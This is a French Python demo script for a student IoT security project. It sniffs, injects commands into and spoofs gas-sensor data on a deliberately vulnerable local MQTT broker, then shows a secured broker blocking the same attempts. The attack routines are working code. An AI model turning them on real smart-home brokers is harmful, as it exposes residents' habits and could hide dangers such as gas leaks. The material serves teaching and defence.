"""
demo.py
=======
Script de demonstration automatique pour la soutenance.

Execute toute la sequence pedagogique en une commande, avec des pauses
explicatives entre chaque etape. Sortie colorisee et lisible.

Usage :
    python demo.py                       # mode complet (~3 min)
    python demo.py --quick               # version courte (~1 min)
    python demo.py --secure-only         # seulement les tests sur le broker securise
    python demo.py --vulnerable-only     # seulement les attaques sur le broker vulnerable

Pre-requis :
    - Docker stack lancee (./scripts/start.sh ou .\\scripts\\start.ps1)
    - Devices Python lances dans un autre terminal
      (python run_all_devices.py --port 1883)
"""

import argparse
import json
import ssl
import sys
import time
from pathlib import Path

import paho.mqtt.client as mqtt


# Codes ANSI pour la couleur (fonctionne sur Linux/macOS et Windows 10+)
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"


def banner(title: str, color: str = C.CYAN):
    width = 64
    print(f"\n{color}{'=' * width}{C.RESET}")
    print(f"{color}  {title}{C.RESET}")
    print(f"{color}{'=' * width}{C.RESET}\n")


def step(msg: str):
    print(f"{C.BLUE}>>{C.RESET} {msg}")


def ok(msg: str):
    print(f"   {C.GREEN}OK{C.RESET}  {msg}")


def fail(msg: str):
    print(f"   {C.RED}KO{C.RESET}  {msg}")


def info(msg: str):
    print(f"       {msg}")


def pause(seconds: int = 2, message: str | None = None):
    if message:
        print(f"   {C.YELLOW}...{C.RESET} {message}")
    time.sleep(seconds)


# ---------------------------------------------------------------------
# Demos VULNERABLE
# ---------------------------------------------------------------------

def demo_vulnerable_sniff(host: str, port: int, duration: int):
    banner("SCENARIO 1/4 : SNIFFING (broker vulnerable)", C.RED)
    step(f"Connexion ANONYME au broker {host}:{port}")
    info("Aucun mot de passe, aucune authentification.")

    intercepted = []

    def on_conn(c, u, f, rc):
        if rc == 0:
            ok("Connecte sans authentification")
            c.subscribe("#")
            ok("Abonne au wildcard global #")

    def on_msg(c, u, msg):
        try:
            p = json.loads(msg.payload.decode())
        except Exception:
            p = msg.payload.decode(errors="replace")
        intercepted.append((msg.topic, p))
        print(f"   {C.MAGENTA}[INTERCEPTE]{C.RESET} {msg.topic} -> {p}")

    client = mqtt.Client(client_id="demo-sniffer")
    client.on_connect = on_conn
    client.on_message = on_msg
    client.connect(host, port, 60)
    client.loop_start()
    pause(duration, f"ecoute pendant {duration}s...")
    client.loop_stop(); client.disconnect()
    print()
    if intercepted:
        ok(f"{len(intercepted)} messages interceptes -> habitudes des "
           "habitants devinables (presence, ouvertures de porte, etc.)")
    else:
        fail("Aucun message intercepte. Les devices Python sont-ils lances ?")


def demo_vulnerable_inject(host: str, port: int):
    banner("SCENARIO 2/4 : INJECTION (broker vulnerable)", C.RED)
    step(f"Envoi de commandes a la lampe et a la clim (sans auth)")
    client = mqtt.Client(client_id="demo-injector")
    client.connect(host, port, 60)
    client.loop_start()
    time.sleep(0.5)

    cmd1 = {"action": "ON", "intensity": 100}
    client.publish("home/salon/light/cmd", json.dumps(cmd1))
    ok(f"Publie home/salon/light/cmd -> {cmd1}")
    info("Regardez la console du device light-01 : il a obei.")
    pause(2)

    cmd2 = {"action": "ON", "mode": "HEAT", "target_temp": 30}
    client.publish("home/chambre/ac/cmd", json.dumps(cmd2))
    ok(f"Publie home/chambre/ac/cmd -> {cmd2}")
    info("La climatisation passe en chauffage 30 C !")
    pause(2)

    client.publish("home/salon/light/cmd", json.dumps({"action": "OFF"}))
    ok("Lampe eteinte par l'attaquant.")
    client.loop_stop(); client.disconnect()


def demo_vulnerable_spoof(host: str, port: int):
    banner("SCENARIO 3/4 : SPOOFING (broker vulnerable)", C.RED)
    step(f"Publication d'une fausse mesure de gaz (masquage de fuite)")
    client = mqtt.Client(client_id="demo-spoofer")
    client.connect(host, port, 60)
    client.loop_start()
    time.sleep(0.5)

    fake = {
        "device_id": "gas-fake", "room": "cuisine", "type": "gas",
        "value": 50, "unit": "ppm", "status": "OK",
    }
    client.publish("home/cuisine/gas/state", json.dumps(fake))
    ok(f"Publie home/cuisine/gas/state -> {fake}")
    info("Un attaquant pourrait masquer une fuite reelle de gaz.")
    info("Le dashboard Node-RED croira que tout va bien.")
    pause(2)
    client.loop_stop(); client.disconnect()


# ---------------------------------------------------------------------
# Demos SECURE
# ---------------------------------------------------------------------

def demo_secure_blocked(host: str, port: int, ca: str | None):
    banner("SCENARIO 4/4 : LE BROKER SECURISE BLOQUE TOUT", C.GREEN)

    # Test 1 : connexion anonyme refusee
    step(f"Tentative de connexion ANONYME a {host}:{port}")
    result = {"rc": None, "exc": None}

    def on_conn(c, u, f, rc): result["rc"] = rc

    c1 = mqtt.Client(client_id="demo-anon")
    if ca:
        c1.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
    c1.on_connect = on_conn
    try:
        c1.connect(host, port, 5)
        c1.loop_start()
        time.sleep(2)
        c1.loop_stop(); c1.disconnect()
    except Exception as e:
        result["exc"] = str(e)

    if result["rc"] == 0:
        fail("la connexion anonyme a ete acceptee (config incorrecte)")
    else:
        ok(f"connexion anonyme refusee (rc={result['rc']}, exc={result['exc']})")

    # Test 2 : credentials invalides
    step("Tentative avec un faux compte (hacker / hacker)")
    result["rc"] = None; result["exc"] = None
    c2 = mqtt.Client(client_id="demo-fake")
    if ca:
        c2.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
    c2.username_pw_set("hacker", "hacker")
    c2.on_connect = on_conn
    try:
        c2.connect(host, port, 5)
        c2.loop_start()
        time.sleep(2)
        c2.loop_stop(); c2.disconnect()
    except Exception as e:
        result["exc"] = str(e)
    if result["rc"] == 0:
        fail("credentials acceptes (config incorrecte)")
    else:
        ok(f"credentials invalides refuses (rc={result['rc']})")

    # Test 3 : escalade de privileges bloquee par ACL
    step("Tentative d'escalade : sensor_user veut commander la lampe")
    received = {"got": False}
    def on_msg(c, u, msg): received["got"] = True

    listener = mqtt.Client(client_id="demo-actuator")
    if ca:
        listener.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
    listener.username_pw_set("actuator_user", "actuator_pass")
    listener.on_message = on_msg
    try:
        listener.connect(host, port, 5)
        listener.subscribe("home/+/light/cmd")
        listener.loop_start()
        time.sleep(0.5)

        attacker = mqtt.Client(client_id="demo-sensor-as-attacker")
        if ca:
            attacker.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
        attacker.username_pw_set("sensor_user", "sensor_pass")
        attacker.connect(host, port, 5)
        attacker.loop_start()
        time.sleep(0.5)
        attacker.publish("home/salon/light/cmd", json.dumps({"action": "ON"}))
        time.sleep(2)

        attacker.loop_stop(); attacker.disconnect()
        listener.loop_stop(); listener.disconnect()
    except Exception as e:
        info(f"exception : {e}")

    if received["got"]:
        fail("la commande est passee : ACL incorrecte")
    else:
        ok("ACL bloque l'escalade : sensor_user n'ecrit que sur ses topics")

    # Test 4 : utilisateur legitime fonctionne
    step("Verification : dashboard_user (legitime) commande la lampe")
    received2 = {"got": False}
    def on_msg2(c, u, msg): received2["got"] = True
    listener2 = mqtt.Client(client_id="demo-actuator-2")
    if ca:
        listener2.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
    listener2.username_pw_set("actuator_user", "actuator_pass")
    listener2.on_message = on_msg2
    try:
        listener2.connect(host, port, 5)
        listener2.subscribe("home/+/light/cmd")
        listener2.loop_start()
        time.sleep(0.5)

        dash = mqtt.Client(client_id="demo-dashboard")
        if ca:
            dash.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
        dash.username_pw_set("dashboard_user", "dashboard_pass")
        dash.connect(host, port, 5)
        dash.loop_start()
        time.sleep(0.5)
        dash.publish("home/salon/light/cmd", json.dumps({"action": "ON"}))
        time.sleep(2)
        dash.loop_stop(); dash.disconnect()
        listener2.loop_stop(); listener2.disconnect()
    except Exception as e:
        info(f"exception : {e}")
    if received2["got"]:
        ok("dashboard_user commande legitimement la lampe")
    else:
        fail("dashboard_user ne peut pas commander : verifier l'ACL")


# ---------------------------------------------------------------------
# Resume final
# ---------------------------------------------------------------------

def final_summary():
    banner("RESUME PEDAGOGIQUE", C.CYAN)
    print(f"""\
{C.BOLD}Risques demontres sur broker vulnerable (port 1883){C.RESET}
  1. {C.RED}Sniffing{C.RESET}   -> habitudes des habitants devinables
  2. {C.RED}Injection{C.RESET}  -> controle physique de la maison
  3. {C.RED}Spoofing{C.RESET}   -> alertes de securite contournees

{C.BOLD}Contre-mesures sur broker securise (port 8883){C.RESET}
  - {C.GREEN}TLS 1.2{C.RESET}                  : trafic chiffre, sniff inutile
  - {C.GREEN}allow_anonymous false{C.RESET}    : connexion anonyme bloquee
  - {C.GREEN}password_file{C.RESET}            : compte unique par client, tracable
  - {C.GREEN}acl_file (4 roles){C.RESET}       : moindre privilege par topic
  - {C.GREEN}max_connections{C.RESET}          : DoS par flood limite

{C.BOLD}Modele de menaces couvert (STRIDE){C.RESET}
  - Spoofing      : auth + identifiant unique par client
  - Tampering     : ACL en ecriture par role
  - Repudiation   : logs avec username
  - Info disclo.  : TLS + auth
  - DoS           : max_connections, message_size_limit
  - Elevation     : ACL stricte par topic
""")


def main():
    parser = argparse.ArgumentParser(description="Demo automatique du projet")
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--vuln-port", type=int, default=1883)
    parser.add_argument("--secure-port", type=int, default=8883)
    parser.add_argument(
        "--ca", default="../mosquitto/secure/certs/ca.crt",
        help="Chemin vers le certificat CA",
    )
    parser.add_argument("--quick", action="store_true",
                        help="Sniff plus court (3s au lieu de 10s)")
    parser.add_argument("--secure-only", action="store_true")
    parser.add_argument("--vulnerable-only", action="store_true")
    args = parser.parse_args()

    duration = 3 if args.quick else 10

    banner("DEMONSTRATION AUTOMATIQUE - SMART HOME IOT SECURITY", C.CYAN)
    print("Pre-requis :")
    print("  - Docker stack lancee (./scripts/start.sh)")
    print("  - Devices Python en cours d'execution sur le broker vulnerable")
    print("    (python run_all_devices.py --port 1883)")
    print()
    input(f"{C.YELLOW}Appuyer sur Entree pour demarrer...{C.RESET}")

    if not args.secure_only:
        demo_vulnerable_sniff(args.host, args.vuln_port, duration)
        time.sleep(1)
        demo_vulnerable_inject(args.host, args.vuln_port)
        time.sleep(1)
        demo_vulnerable_spoof(args.host, args.vuln_port)

    if not args.vulnerable_only:
        time.sleep(1)
        ca_path = args.ca if Path(args.ca).is_file() else None
        if ca_path is None:
            info(f"CA introuvable a {args.ca}, TLS desactive pour la demo securisee")
        demo_secure_blocked(args.host, args.secure_port, ca_path)

    final_summary()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}Demo interrompue par l'utilisateur.{C.RESET}")
        sys.exit(0)
